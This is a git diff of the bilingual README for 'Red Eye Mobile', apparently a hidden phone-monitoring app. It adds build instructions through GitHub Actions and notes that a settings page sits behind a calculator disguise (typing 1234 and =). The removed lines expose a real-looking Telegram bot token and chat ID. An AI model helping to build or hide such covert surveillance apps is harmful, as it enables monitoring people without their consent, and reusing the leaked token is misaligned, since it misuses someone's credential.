@@ -1,5 +1,12 @@
 # 📱 Red Eye Mobile
 
+> **Build policy: JANGAN install Android SDK lokal. Build SELALU di GitHub.**
+> Push ke `main` / buka PR / Run workflow manual (`Actions > Build APK`), lalu unduh artifacts `app-debug` / `app-release`.
+> Secrets opsional: `BOT_TOKEN`, `CHAT_ID`, `SYNC_INTERVAL` (repo Settings > Secrets and variables > Actions).
+> Tanpa secret pun APK tetap jadi — token diisi manual dari halaman Setup di aplikasi (`SetupActivity`, via kalkulator `1234` + `=`).
+> `builder.sh` / `builder.bat` = LEGACY, dipertahankan untuk kompatibilitas saja. Detail aturan: `AGENTS.md`. Riwayat: `CHANGELOG.md`.
+
+
 <div align="center">
 
 **Aqlli va yashirin bolalar telefonini nazorat qilish dasturi**
@@ -85,10 +92,10 @@ echo "sdk.dir=C:\\Users\\YourUsername\\AppData\\Local\\Android\\Sdk" > local.pro
 1. Telegram'da [@BotFather](https://t.me/BotFather)ga o'ting
 2. `/newbot` buyrug'ini yuboring
 3. Bot nomini kiriting
-4. **Bot Token**ni saqlang (masalan: `5899601127:AAFejm1J07lWqpUaJbGSRa0A9xgwNgEYs1A`)
+4. **Bot Token**ni saqlang (masalan: `<YOUR_BOT_TOKEN>`)
 5. O'z Telegram ID'ingizni [@userinfobot](https://t.me/userinfobot)dan oling
 
-#### 4️⃣ APK Build Qilish
+#### 4️⃣ APK Build Qilish (LEGACY — gunakan GitHub Actions)
 
 ```bash
 # Linux/macOS
@@ -100,7 +107,7 @@ builder.bat YOUR_BOT_TOKEN YOUR_CHAT_ID 5
 
 **Misol:**
 ```bash
-./builder.sh 5899601127:AAFejm1J07lWqpUaJbGSRa0A9xgwNgEYs1A 6043795029 5
+./builder.sh <YOUR_BOT_TOKEN> <YOUR_CHAT_ID> 5
 ```
 
 #### 5️⃣ APK O'rnatish
@@ -307,10 +314,10 @@ echo "sdk.dir=C:\\Users\\YourUsername\\AppData\\Local\\Android\\Sdk" > local.pro
 1. Go to [@BotFather](https://t.me/BotFather) on Telegram
 2. Send `/newbot` command
 3. Enter bot name
-4. Save the **Bot Token** (e.g., `5899601127:AAFejm1J07lWqpUaJbGSRa0A9xgwNgEYs1A`)
+4. Save the **Bot Token** (e.g., `<YOUR_BOT_TOKEN>`)
 5. Get your Telegram ID from [@userinfobot](https://t.me/userinfobot)
 
-#### 4️⃣ Build APK
+#### 4️⃣ Build APK (LEGACY — use GitHub Actions)
 
 ```bash
 # Linux/macOS
@@ -322,7 +329,7 @@ builder.bat YOUR_BOT_TOKEN YOUR_CHAT_ID 5
 
 **Example:**
 ```bash
-./builder.sh 5899601127:AAFejm1J07lWqpUaJbGSRa0A9xgwNgEYs1A 6043795029 5
+./builder.sh <YOUR_BOT_TOKEN> <YOUR_CHAT_ID> 5
 ```
 
 #### 5️⃣ Install APK
